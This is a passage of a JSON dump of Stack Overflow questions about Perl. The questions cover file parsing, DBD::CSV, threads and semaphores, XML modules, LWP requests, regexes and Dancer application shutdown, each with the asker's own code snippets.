ways...</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":13017907,"title":"How do I compare two lines (if they are equal or not equal) of a file read inside a while loop?","body":"<p>I have a file like this one below, where the line starting with a number is an ID for my sample and the following lines are the data.</p>\n\n<pre><code>10001;02/07/98;;PI;M^12/12/59^F^^SP^09/12/55\n;;;;;M1|F1|SP1;9;9;9;9;9;9;;D16S539\n;;;;;M1|F1|SP1;9;9;9;9;9;9;;D7S820\n;;;;;M1|F1|SP1;9;9;9;9;9;9;;D13S317\n;;;;;M1|F1|SP1;9;9;9;9;9;9;;D5S818\n10002;02/07/98;;RJ;F^20/04/86^SP^\n;;;;;F1|SP1;;;12;10;12;11;;D10S212\n;;;;;F1|SP1;;;8;8;10;8;;D7S820\n;;;;;F1|SP1;;;12;11;14;11;;D13S317\n;;;;;F1|SP1;;;13;12;13;8;;D5S818\n</code></pre>\n\n<p>For the lines containing the data, I would like to test whether or not the fields 6-11 are the same because I want the data only if they are <strong>not equal</strong> to each other (in the first case they are all '9').</p>\n\n<p>So I thought about splitting the lines and store them as an array, and then compare the arrays with the ~~ operator. But how do I do that if I'm reading the file inside a while loop and the array is redefined each line? \nOr maybe there is better ways to do that.</p>\n\n<p>Thanks in advance!</p>\n\n<p>This is a pseudocode to illustrate what I want to do:</p>\n\n<pre><code>open FILE, $ARGV[0] or die $!;\nwhile (&lt;FILE&gt;) {\n    chomp;\n    my @field = split /;/;\n    if ($field[0] eq '') {\n        if @fields[6 .. 11] is not equal to @fields[6 .. 11] in all the next lines {\n            do my calculation;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["multithreading","perl","file","semaphore"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13009209,"title":"Using semaphores while modyifing file in perl","body":"<p>I'm kind of newbie to threads in perl.</p>\n\n<p>I have a file with a list of projects (each project is in a separate line), and i want to build those projects in parallel. \nCurrently, each thread:</p>\n\n<ol>\n<li>opens the file as \"read\" mode</li>\n<li>saves a list of some projects (= some file lines)</li>\n<li>closes the file</li>\n<li>opens the file again- as \"write\" mode</li>\n<li>rewrites it without the lines that were selected</li>\n</ol>\n\n<p>in order to make sure each thread is the only one to access the file, im trying to use semaphore.</p>\n\n<p>for some reason, threads collisons are occurred, and i can't figure out what am i doing wrong.</p>\n\n<p>i can see (in my \"REPORT\" which also gets the current time for each build) \nthat deifferent threads select the same projects from the \"shared\" file (it happens only once in a while, but still..)</p>\n\n<p>i'm not even sure if my $semaphore decleration is legal as \"my\" variable.</p>\n\n<p>Any help would be truly appreciated!! </p>\n\n<p>Thanks.</p>\n\n<hr>\n\n<p>here's a part of my code:</p>\n\n<pre><code>    my $semaphore = Thread::semaphore-&gt;new() ;\n\nsub build_from_targets_list{\n\n    #...\n    open(REPORT, \"+&gt;$REPORT_tmp\");  # Open for output\n    #....\n    @threads =();\n\n\n    for ($i = 0; $i &lt; $number_of_cores; $i++){\n        my $thr = threads-&gt;new(\\&amp;compile_process, $i,*REPORT);\n        push @threads, $thr;\n    }\n\n    $_-&gt;join for @threads;\n    close (REPORT);\n}\n### Some stuff..\n\n\nsub compile_process{\n\n    *REPORT = shift(@_);\n    #...\n\n    while (1){\n        $semaphore-&gt;down();\n        open (DATA_FILE, $shared_file);\n        flock(DATA_FILE, 2);\n        while ($record = &lt;DATA_FILE&gt;) {\n            chomp($record);\n            push(@temp_target_list,$record);    \n        }\n\n\n        # ... choose some lines (=projects)...\n        # remove the projects that should be built by this thread:\n        for ($k = 0; $k &lt; $num_of_targets_in_project; $k++){            \n            shift(@temp_target_list);\n\n        }\n\n        close(DATA_FILE);       \n        open (REWRITE,\"&gt;$shared_file\");\n\n        flock(REWRITE, 2);\n\n        seek(REWRITE, 0, 0); \n        foreach $temp_target (@temp_target_list){\n\n            print REWRITE \"$temp_target\\n\";\n\n        }\n\n        close (REWRITE);\n\n        ## ... BUILD selected projects...\n\n        $semaphore-&gt;up();\n        }\n}\n</code></pre>\n"},{"tags":["perl","csv","dbd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":13016794,"title":"How to manually specify the column names using DBD::CSV?","body":"<p>I am using <a href=\"http://search.cpan.org/~hmbrand/DBD-CSV-0.36/lib/DBD/CSV.pm#Driver_specific_attributes\" rel=\"nofollow\">DBD::CSV</a> to show csv data. Sometimes the file doesn't contain column names, so we have to manually define it. But after I followed the documentation, I got stuck with how to make the attribute skip_first_row work. The code I have is:</p>\n\n<pre><code>#! perl\nuse strict;\nuse warnings;\nuse DBI;\n\nmy $dbh = DBI-&gt;connect(\"dbi:CSV:\", undef, undef, {\n    f_dir            =&gt; \".\",\n    f_ext            =&gt; \".txt/r\",\n    f_lock           =&gt; 2,\n    csv_eol          =&gt; \"\\n\",\n    csv_sep_char     =&gt; \"|\",\n    csv_quote_char   =&gt; '\"',\n    csv_escape_char  =&gt; '\"',\n    csv_class        =&gt; \"Text::CSV_XS\",\n    csv_null         =&gt; 1,\n    csv_tables       =&gt; {\n        info =&gt; {\n            file =&gt; \"countries.txt\"\n        }\n    },  \n    FetchHashKeyName =&gt; \"NAME_lc\",\n}) or die $DBI::errstr;\n\n$dbh-&gt;{csv_tables}-&gt;{countries} = {\n  skip_first_row =&gt; 0,\n  col_names =&gt; [\"a\",\"b\",\"c\",\"d\"],\n};\n\nmy $sth = $dbh-&gt;prepare (\"select * from countries limit 1\");\n$sth-&gt;execute;\nwhile (my @row = $sth-&gt;fetchrow_array) {\n  print join \" \", @row;\n  print \"\\n\"\n}\nprint join \" \", @{$sth-&gt;{NAME}};\n</code></pre>\n\n<p>The countries.txt file is like this:</p>\n\n<pre><code>AF|Afghanistan|A|Asia\nAX|\"Aland Islands\"|E|Europe\nAL|Albania|E|Europe\n</code></pre>\n\n<p>But when I ran this script, it returns </p>\n\n<pre><code>AX Aland Islands E Europe\nAF AFGHANISTAN A ASIA\n</code></pre>\n\n<p>I expected it to either return:</p>\n\n<pre><code>AF AFGHANISTAN A ASIA\na b c d\n</code></pre>\n\n<p>or </p>\n\n<pre><code>a b c d\na b c d\n</code></pre>\n\n<p>Does any know what's going on here?</p>\n"},{"tags":["perl","asterisk","festival","agi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13014363,"title":"Using Festival from an Asterisk AGI script","body":"<p>This feels like a really silly problem but I just can't figure it out. I am writing an AGI script in Perl using <code>Asterisk::AGI</code> which needs to invoke Festival to read some text to the caller. I know that in the dialplan I can say</p>\n\n<pre><code>Festival('Hello caller','any')\n</code></pre>\n\n<p>and it will say 'Hello caller' and allow interruption by any key. The trick is doing that from the AGI script. If I do this:</p>\n\n<pre><code>$agi-&gt;exec('Festival', '\"Hello caller\"')\n</code></pre>\n\n<p>It will say 'Hello caller'. No problem. But I can't get it to deal with the potential for key interruption. It looks kind of like a second parameter, but also kind of not like one. I tried</p>\n\n<pre><code>$agi-&gt;exec('Festival', '\"Hello caller\"', 'any')\n</code></pre>\n\n<p>And it seems to ignore it completely (no key interruption takes place). I also tried</p>\n\n<pre><code>$agi-&gt;exec('Festival', q{\"Hello caller\",'any'})\n</code></pre>\n\n<p>And it says the 'any' bit, which leads me to be seriously confused about the quoting (the double quotes inside the string I pass was the only way I could get it to do more than say the first word).</p>\n\n<pre><code>$agi-&gt;exec('Festival', q{\"Hello caller\", 'any'})\n</code></pre>\n\n<p>Just ignores the 'any' bit entirely.</p>\n\n<p>The only resources online that mention using Festival from an AGI script all talk about invoking it externally, saving it to a temporary file and then playing that back. Do I really have to go down that path? Shouldn't I be able to run any dialplan application at all with any arguments I like from an AGI?</p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13014959,"title":"trying to find/replcace char entity using perl xml::dom::node->expandEntityRefs()","body":"<p>I'm writing a perl script to make some changes to an xml file, and one of the things I need to do is find one entity and replace another. </p>\n\n<p>I want to find</p>\n\n<pre><code>&lt;myelement&gt;&amp;#x25aa;&lt;/myelement&gt;\n</code></pre>\n\n<p>and replace with </p>\n\n<pre><code>&lt;myelement&gt;&amp;#x2022;&lt;/myelement&gt;\n</code></pre>\n\n<p>I'm trying to use the XML::DOM::Node->expandEntityRefs() function, but not having any luck. I'm basically trying to do it like this:</p>\n\n<pre><code># $nodeMyElement declared at top of function, not shown\nmy $textNode = $nodeMyElement-&gt;getFirstChild();\n\nmy $sChildText = $textNode -&gt;toString();\n# when calling from main node, the string is just nothing\nmy $test = $nodeMyElement -&gt;expandEntityRefs( $sChildText );\n</code></pre>\n\n<p># when calling from main package I get an error: Can't use string (\"XML::DOM::Node\") as an ARRAY ref while \"strict refs\" in use at C:/Perl/site/lib/XML/DOM.pm line 1244.\n    my $test2 = XML::DOM::Node->expandEntityRefs( $sChildText );</p>\n\n<p>any ideas on what I'm doing wrong, or a better approach to this problem? \nthanks, \nbp</p>\n"},{"tags":["perl","csv","dbd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13016046,"title":"How to use DBD::CSV to get column names row?","body":"<p>I am using <a href=\"http://search.cpan.org/~hmbrand/DBD-CSV-0.36/lib/DBD/CSV.pm#Driver_specific_attributes\" rel=\"nofollow\">DBD::CSV</a> to show csv data. The code I have is:</p>\n\n<pre><code>#! perl\nuse strict;\nuse warnings;\nuse DBI;\n\nmy $dbh = DBI-&gt;connect(\"dbi:CSV:\", undef, undef, {\n    f_dir            =&gt; \".\",\n    f_ext            =&gt; \".txt/r\",\n    f_lock           =&gt; 2,\n    csv_eol          =&gt; \"\\n\",\n    csv_sep_char     =&gt; \"|\",\n    csv_quote_char   =&gt; '\"',\n    csv_escape_char  =&gt; '\"',\n    csv_class        =&gt; \"Text::CSV_XS\",\n    csv_null         =&gt; 1,\n    csv_tables       =&gt; {\n        info =&gt; {\n            file =&gt; \"countries.txt\"\n        }\n    },  \n    FetchHashKeyName =&gt; \"NAME_lc\",\n}) or die $DBI::errstr;\n\n$dbh-&gt;{csv_tables}-&gt;{countries} = {\n  skip_first_row =&gt; 0,\n  col_names =&gt; [\"a\",\"b\",\"c\",\"d\"],\n  raw_header =&gt; 1,\n};\n\nmy $sth = $dbh-&gt;prepare (\"select * from countries limit 1\");\n$sth-&gt;execute;\nwhile (my @row = $sth-&gt;fetchrow_array) {\n  print join \" \", @row;\n  print \"\\n\"\n}\n</code></pre>\n\n<p>The countries.txt file is like this:</p>\n\n<pre><code>ISO_COUNTRY|COUNTRY_NAME|REGION_CODE|REGION_NAME\nAF|Afghanistan|A|Asia\nAX|\"Aland Islands\"|E|Europe\nAL|Albania|E|Europe\n</code></pre>\n\n<p>But when I ran this script, it returns </p>\n\n<pre><code>AF Afghanistan A Asia\n</code></pre>\n\n<p>I wanted it to return:</p>\n\n<pre><code>ISO_COUNTRY COUNTRY_NAME REGION_CODE REGION_NAME\n</code></pre>\n\n<p>Does any one know how to achieve this using DBD::CSV module?</p>\n\n<p>Another question is why the col_names attribute setting didn't take effect?\nHow to make it return the following? </p>\n\n<pre><code> a b c d\n</code></pre>\n"},{"tags":["perl","xml-twig"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":13005107,"title":"how to get unkown root tag parse to function","body":"<p>i doing xml conversion, here i define root tag as book, but how to get unknow root tag define here, i need common syntex, </p>\n\n<pre><code>use twig;\n\nmy $story_file = XML::Twig-&gt;new(\n                                   twig_handlers =&gt;{\n                                            'book' =&gt; \\&amp;book,\n                                            keep_atts_order =&gt; 1,\n                                            },\n                                            pretty_print =&gt; 'indented',\n                                  );\n\n$story_file-&gt;parsefile('unknown.xml');\n$story_file-&gt;print($out);\n</code></pre>\n\n<p>i tried,</p>\n\n<pre><code>use twig;\n\nmy $story_file = XML::Twig-&gt;new(\n                                   twig_handlers =&gt;{\n                                            root =&gt; \\&amp;book,\n                                            keep_atts_order =&gt; 1,\n                                            },\n                                            pretty_print =&gt; 'indented',\n                                  );\n\n$story_file-&gt;parsefile('unknown.xml');\n$story_file-&gt;print($out);\n</code></pre>\n\n<p>It did't work, if any comman syntex for root tag, plase with examples</p>\n"},{"tags":["arrays","perl","hashmap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12997758,"title":"Perl: Combining array elements with hashmap values","body":"<p>I'm trying to paste two values together in a string. One value is an array element and the other a hashmapvalue. But I keep having this error:</p>\n\n<pre><code>Use of uninitialized value in concatenation (.) or string\n  at makeNewCSV.pl line 104, &lt;$fh&gt; line 2020.\n</code></pre>\n\n<p>This is my code:</p>\n\n<pre><code>use feature qq(say);\n\nmy @nodeIdArray;\nmy @sequenceArray;\nmy @completeLineArray;\n\nmy %fastaHash = ();\n\n[...]\n\nsub readCsv{#Reads the CSV and puts all the Node ID's in an array\n\nmy ($file) = @_;\nmy $nodeID = qr{\\d+\\,(\\d+)};\n\nopen(my $fh, '&lt;', $file) or die \"Error while reading CSV: $!\";\n\n    while(my $line = &lt;$fh&gt;){\n\n        if($line =~ $nodeID){\n\n            push(@nodeIdArray, $1);\n        }\n    }\n\nclose($fh);\n\nsearchFasta();\n}\n\n\nsub searchFasta{#Reads and searches the fasta file for contigs with a matching node ID\n\nmy ($file) = $ARGV[1];\nmy $fastaNodeID = qr{&gt;NODE_(\\d+)_LENGTH_\\d+_COV_[\\d.]+\\n([ACTGN\\n]+)};\nmy @matches;\n\n\nopen(my $fh, '&lt;', $file) or die \"Error while reading fasta: $!\";\n\n    my @allLines = &lt;$fh&gt;;\n\n    my $makeString = join('', @allLines);\n    my $lineAsString = uc($makeString);\n\n    while($lineAsString =~ m/$fastaNodeID/g){\n\n        my $node_ID = $1;\n        my $sequence = $2;\n\n        $sequence =~ s/\\n//;\n\n        $fastaHash{$node_ID} = $sequence;\n    }\n\nclose($fh);\n\n\npasteLines();\n}\n\nsub pasteLines{\n\nmy $fullLine = \"\";\nmy $file = $ARGV[0];\nmy @hashKeys = keys(%fastaHash);\nmy $index = 0;\nmy $numberOfRepeat = 0;\n\nopen(my $fh, '&lt;', $file) or die \"Error while reading CSV (2): $!\";\n\n\n    my @allLines = &lt;$fh&gt;;\n    my $arrayLength = @allLines;\n\n    foreach my $line(@allLines){\n\n        chomp($line);\n    }\n\n    while($numberOfRepeat &lt;= $arrayLength){     \n\n        foreach my $key(@hashKeys){\n\n            if($key = $nodeIdArray[$index]){\n\n\n                no warnings qw(uninitialized);  #DEBUG:\n                say qq(DEBUG: \\$fastaHash{$key} = \"$fastaHash{$key}\");\n                say qq(DEBUG: \\$fullLine = $allLines[$index] . \",\" . $fastaHash{$key};);\n                use warnings qw(uninitialized);  #DEBUG:\n\n\n                $fullLine = $allLines[$index] . \",\" . $fastaHash{$key}; #This line here gives the problems\n                push(@completeLineArray, $fullLine);\n\n                $index++;\n            }\n\n            else{\n\n                $index++;\n            }\n        }\n    }\n\nclose($fh);\n\n\n}\n</code></pre>\n\n<p>$index is for looping through the array and @allLines contains all the lines from a read file. (<code>&lt;$fh&gt;</code> is my filehandle).</p>\n\n<p><strong>Edit 22-10-2012:</strong> I added the entire code to show where the variables are made</p>\n"},{"tags":["perl","compilation"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":136,"score":6,"question_id":12908416,"title":"How to check if perl script doesn't have any compilation errors?","body":"<p>I am calling many perl scripts in my bash script (sometimes from csh also). At the start of bash script I want to put a test which checks if all the perl scripts are devoid of any compilation errors. One way of doing this would be to actually call the perl script from bash script and grep for \"compilation error\" in the piped log file. But this becomes messy as different perl scripts are called at different points in the code. Hence I want to do this at the very start of the bash script. Is there a way to check if the perl script has no compilation error?</p>\n"},{"tags":["perl","hash","random"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":13014541,"title":"Randomise/Shuffle hash keys in Perl","body":"<p>I run through a hash various times, without changing the contents of the hash. I want the hash to iterate in a random order each time (I know that a hash's internal order is random, but I need that random order to change)</p>\n\n<p>The code I want this for is below:</p>\n\n<pre><code> for (my $i=1; $i&lt;=$PopulationsizeA;$i++){ \n    my $P1 = rand;\n    my $total=0; \n    my $Parent1='Parent1';\n    my $P1A;\nwhile ((my $Genotype1, my $Fitness1)=each (%Normalisedfithash)){\n        $P1A=$P1-$total;\n\n        if ($Parent1 eq 'Parent1'){ \n            if ($P1A&lt;=$Fitness1){\n\n                $Parent1=$Genotype1;\n                $P1Tallyhash{$Genotype1}+=1; \n\n            }\n            else{\n                $total+=$Fitness1;\n            }\n        }\n    }\n  }\n</code></pre>\n\n<p>I need the order of %Normalisedfithash to randomly change for each iteration of the for loop. I saw a similar <a href=\"http://stackoverflow.com/questions/6684209/how-to-shuffle-the-values-in-a-hash\">question</a> however I don't want the values to randomly change keys but instead want the keys to keep their associated value but randomly change order.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","unix","tomcat","ldap","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12957662,"title":"LDAP Authentication CGI","body":"<p>I have a simple webpage deployed to tomcat which runs certain shell scripts based on user selection. The pages are written in html and cgi/perl.</p>\n\n<p>We already have a working ldap server and directory. I need to be able to add security to the web page I created so a user is asked to login using their ldap account when trying to access the home page or any off the sub pages.</p>\n\n<p>How do I add ldap authentication to my web page?</p>\n\n<p>Please be very specific as I am new to all of this. Step by step instructions including code would be greatly appreciated. Thank You</p>\n\n<p>I did a lot of research on google, but all of the solutions are generic, and I don't know where to start.</p>\n\n<p>This is a good article, but I'm not sure where do I put my connection to ldap and the binding (which of my pages)? How do I make sure the authentication will apply to the sub pages as well, or any other one created in the future?</p>\n\n<p><a href=\"http://www.perlmonks.org/?node_id=32196\" rel=\"nofollow\">http://www.perlmonks.org/?node_id=32196</a></p>\n\n<p>Cheers</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":81,"score":0,"question_id":9184638,"title":"Regarding the differences among these four regular expressions with minor differences","body":"<p>When learning regular expressions, I once saw the following four examples. How can I understand their differences?</p>\n\n<pre><code>/ABC (?i:s) XYZ/\n/ABC (?x: [A-Z] \\.?  \\s )?XYZ/\n/ABC (?ix: [A-Z] \\.?  \\s )?XYZ/\n/ABC (?x-i: [A-Z] \\.?  \\s )?XYZ/i\n</code></pre>\n\n<p>What do the <code>i</code> and <code>x</code> flags mean?</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":81,"score":-1,"question_id":13001954,"title":"Why is this scalar value returning an int of 1? (Chomp)","body":"<p>$receiver is returning 1. </p>\n\n<pre><code>print \"Who is receiving this message?:\";\nmy $receiver = chomp(my $r = &lt;STDIN&gt;);\nprint $receiver;\n</code></pre>\n\n<p>Also, where can I find some more documentation about chomp? Thank you.</p>\n"},{"tags":["mysql","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12841261,"title":"Perl mysql, why does this fetchrow_array not work?","body":"<p>I have Perl code like so: </p>\n\n<pre><code>$pre = $dbh-&gt;prepare(\"select distinct skills from people\");\n$pre-&gt;execute;\n\nmy @preList;\nwhile (my $row = $pre-&gt;fetchrow_array()) {\n    push (@preList,$row);\n}\nprint \"Pre list: $_\" foreach @preList;\n</code></pre>\n\n<p>When I try the exact same statement in sql it works perfectly, but when I run this program it prints out nothing (suggesting an empty <code>@preList</code>). I am probably doing something very stupid, but cannot see it. I have used this format for getting data before, which works perfectly. Can anyone see what I've done wrong? </p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1481,"score":3,"question_id":3321829,"title":"How do I best pass arguments to a Perl one-liner?","body":"<p>I have a file, <code>someFile</code>, like this:</p>\n\n<pre><code>$cat someFile\nhdisk1 active\nhdisk2 active\n</code></pre>\n\n<p>I use this shell script to check:</p>\n\n<pre><code>$cat a.sh\n#!/usr/bin/ksh\nfor d in 1 2\ndo\n    grep -q \"hdisk$d\" someFile &amp;&amp; echo \"$d : ok\"\ndone\n</code></pre>\n\n<p>I am trying to convert it to Perl:</p>\n\n<pre><code>$cat b.sh\n#!/usr/bin/ksh\nexport d\nfor d in 1 2\ndo\n    cat someFile | perl -lane 'BEGIN{$d=$ENV{'d'};} print \"$d: OK\" if /hdisk$d\\s+/'\ndone\n</code></pre>\n\n<p>I export the variable <code>d</code> in the shell script and get the value using <code>%ENV</code> in Perl. Is there a better way of passing this value to the Perl one-liner?</p>\n"},{"tags":["perl","apache","signals","fcgi","dancer"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12989475,"title":"How to shutdown Perl dancer applications nicely","body":"<p>I run several Perl dancer applications at the same time with the same user in FCGI mode (Apache). As I understand correctly, Apache (or any other webserver) will fork a new dancer application if the current one(s) are busy.</p>\n\n<p>To ensure that no visitor is interrupted by the dancer shutdown I like to let dancer handles the current connection until it finished and then <code>exit</code>/<code>last</code> the process.</p>\n\n<p>How to shutdown a Perl dancer application using kill signal <code>HUP</code> to perfom such nice shutdown?</p>\n\n<p>To rollout a new version of a dancer application I use <code>pkill -HUP perl</code> as the dancer user to \"shutdown\" the processes. But currently (due to missing signal handler) it's more like <em>shoot 'em down</em> as of <em>shutdown an application</em>.</p>\n"},{"tags":["perl","post","lwp"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":5675,"score":5,"question_id":3836526,"title":"How do I send POST data with LWP?","body":"<p>I want to make a program that communicates with <a href=\"http://www.md5crack.com/crackmd5.php\" rel=\"nofollow\">http://www.md5crack.com/crackmd5.php</a>. My goal is to send the site a hash (md5) and hopefully the site will be able to crack it. After, I would like to display the plaintext of the hash. My problem is sending the data to the site. I looked up articles about using LWP however I am still lost. Right now, the hash is not sending, some other junk data is. How would I go about sending a particular string of data to the site?</p>\n\n<pre><code>use HTTP::Request::Common qw(POST);  \nuse LWP::UserAgent; \n\n\n$ua = LWP::UserAgent-&gt;new();  \nmy $req = POST 'http://www.md5crack.com/crackmd5.php', [ \n maxlength=&gt; '2048',\n name=&gt; 'term',\n size=&gt;'55',\n title=&gt;'md5 hash to crack',\n value=&gt; '098f6bcd4621d373cade4e832627b4f6',\n name=&gt;'crackbtn',\n type=&gt;'submit',\n value=&gt;'Crack that hash baby!',\n\n]; \n$content = $ua-&gt;request($req)-&gt;as_string; \n\nprint \"Content-type: text/html\\n\\n\"; \nprint $content;\n</code></pre>\n"},{"tags":["windows","perl","ubuntu"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":47,"score":-2,"question_id":13012392,"title":"How to connect windows 7 from Ubuntu using perl","body":"<p>My server  is running on Ubuntu and want to copy some file from Ubuntu and run a programs and those are local synced automatically  on windows and get the results back to server.</p>\n\n<p>What is best approach the initiated the process from Perl program( running on Ubuntu) </p>\n\n<p>What is the best Perl module I can use to achieve this ? </p>\n"},{"tags":["perl","http","methods","request","options"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13007132,"title":"OPTIONS HTTP Request in Perl","body":"<p>Need to send HTTP OPTIONS Request in Perl. Looked through several CPAN modules; read the docs, no mention of OPTIONS request method, just GET, POST, PUT, DELETE.</p>\n\n<p>Do I need to format this manually? Or is there possibly another library/module that my google-fu is missing out on?</p>\n"},{"tags":["perl","get"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":11766910,"title":"Peculiar Perl Behavior When Using LWP::Simple and Redirecting Output","body":"<p>When running the below file with no output redirection, the output is as expected.</p>\n\n<p><strong>Output</strong></p>\n\n<pre><code>./get_urls.pl\nwww.site1.com\nwww.site2.com\nwww.siten.com\n</code></pre>\n\n<p>When redirecting STDOUT to a file, nothing is recorded in the file.</p>\n\n<pre><code>./get_urls.pl &gt; out\ncat out\n</code></pre>\n\n<p>-</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse LWP::Simple;\nuse strict;\nuse warnings;\n\nmy $i = 1;\n\nwhile (my $contents = get(\"http://www.validpage.com?page=$i\"))\n{\n        #print STDERR $contents.\"\\n\".$url.\"\\n\";\n\n        #print STDERR $i.\"\\n\";\n\n        my @matches = ($contents =~ /_full'&gt;(.*)?&lt;/g);\n\n        for my $match (@matches)\n        {\n                $match =~ s/\\s//g;\n                print $match.\"\\n\";\n        }\n\n        $i++;\n}\n\nprint STDERR \"$i total matches.\\n\";\n</code></pre>\n\n<p>I suspect this behavior is a side effect of using LWP::Simple because output redirects as expected when the get() function call is omitted.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13011074,"title":"LWP::Useragent timeout with HTTP::Headers","body":"<p>I wrote a little script that connectts to an URL, posts some xml data and waits for response, so far so good, I need to set timeout but I think I do it wrong because I get this error message:</p>\n\n<blockquote>\n  <p>Can't locate object method \"timeout\" via package \"HTTP::Headers\" at\n  /usr/share/perl5/HTTP/Message.pm line 644.</p>\n</blockquote>\n\n<p>this is my little code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse LWP::UserAgent;\n\nmy $msg =&lt;&lt; \"EOT\";\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\nEOT\n\nmy $uri = \"http://www.myhostexample.com/script\";\nmy $request = HTTP::Request-&gt;new(POST =&gt; $uri);\n$request-&gt;content_type(\"text/xml\");\n$request-&gt;content($msg);\n\nmy $response = LWP::UserAgent-&gt;new-&gt;request($request);\n$response-&gt;timeout(10);\n#print $response-&gt;content . \"\\n\"; # debug\n\nif ($response-&gt;content =~ /&lt;?xml/s) {\n\n    print \"OK!\\n\";\n}\nelse {\n\n    print \"BAD!\\n\";\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13009575,"title":"How to append file in perl","body":"<p>I have a file a.txt and I have file b.txt.I am reading both the file.</p>\n\n<p>Lets assume a.txt has:</p>\n\n<pre><code>Apple is a fruit.\nI like java.\nI am an human being.\nI am saying hello world.\n</code></pre>\n\n<p>Lets say b.txt has</p>\n\n<pre><code>I am the planet earth\n</code></pre>\n\n<p>Now i am trying to search for particular string in a.txt eg:I am human being.If i find this line .I want to append the content in b.txt to a.txt.My output file should look some thing like this </p>\n\n<pre><code>Apple is a fruit.\nI like java.\nI am the planet earth----&gt;appended\nI am an human being.\nI am saying hello world.\n</code></pre>\n\n<p>I am trying below but its not helping</p>\n\n<pre><code>open (FILE1 , \"a.txt\")\nmy (@fpointer1) = &lt;FILE&gt;; \nclose FILE1\n\nopen (FILE2 , \"b.txt\")\nmy (@fpointer1) = &lt;FILE&gt;; \nclose FILE2\n\n#Open the a.txt again, but this time in write mode\nopen (FILE3 , \"&gt;a.txt\")\nmy (@fpointer1) = &lt;FILE&gt;; \nclose FILE3\n\nforeach $line (@fpointer1) {\n\nif (line to be searched is found)\n--&gt; Paste(Insert) the contents of file \"b.txt\" read through fpointer2\n\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13009744,"title":"Perl: Create directory from strings","body":"<p>Lets suppose I have a base directory <code>/home/user/test/</code>. Now, I have two strings <code>a</code> , <code>b</code> which are going to be the folder inside the base directory like <code>/home/user/test/a/b</code>.</p>\n\n<p>Currently what I am doing is:</p>\n\n<pre><code>use File::Path qw(make_path);\n\nmy $path = \"$basedir\".\"/\".\"a\".\"/\".\"b\"\nmake_path(\"$path\");\n</code></pre>\n\n<p>Now, what am looking for is:</p>\n\n<pre><code>my $dir = \"/home/user/test\";\nmy $x = \"a\";\nmy $y = \"b\";\n\nmake_path($dir, $x, $y); \n</code></pre>\n\n<p>But when I run the above code instead of creating <code>/home/user/test/a/b</code> it creates two separate directory <code>a</code> and <code>b</code> in the current working directory.</p>\n\n<p>So, what is the correct way to achieve this.?</p>\n"},{"tags":["regex","perl","matching"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13009704,"title":"Current position for regex matching in perl","body":"<p>i want to subsequently extract the text snippet between two paths\nin a long string.</p>\n\n<p>Therefore, I use something like this:</p>\n\n<pre><code>while($data=~ m/\\\"(.:\\\\.*?)\\\".:\\\\/sg){...}\n</code></pre>\n\n<p><code>`\\\".:\\\\(.*?)</code> is a path with a <code>\"</code> before.\nand, since the part between the two paths can be any characters,\nI finish the regular expression with the start of the next path: <code>\\\".:\\\\</code></p>\n\n<p>Unfortunately like this the code skips always one match. I believe,\nthat this is, because the subsequent search will start after the last <code>\\\".:\\\\</code> and therefore it will only find the next one.</p>\n\n<p>How can I make sure, that the poisition pointer for the search is set\nback to before the last part of the regular expression (before: <code>\\\".:\\\\</code>)</p>\n\n<p>Edit:</p>\n\n<pre><code>\"y:\\car\\main.cs@@jung\" \"Added format of version number to all sub-parts.\n\n\"Hallo Peter\"\n\n@@@ \"tool kit\" @@@\"\n\n\"y:\\car\\main.cs@@kkla\" (lkaskdn awdiwj)\n\n\"The filter \"function of the new version works with Excel 2007\"only,\nbut is the correct filter structure.\n\n@@@ \"Huihu boy\" @@@\"\n</code></pre>\n\n<p>This file should give me two results in 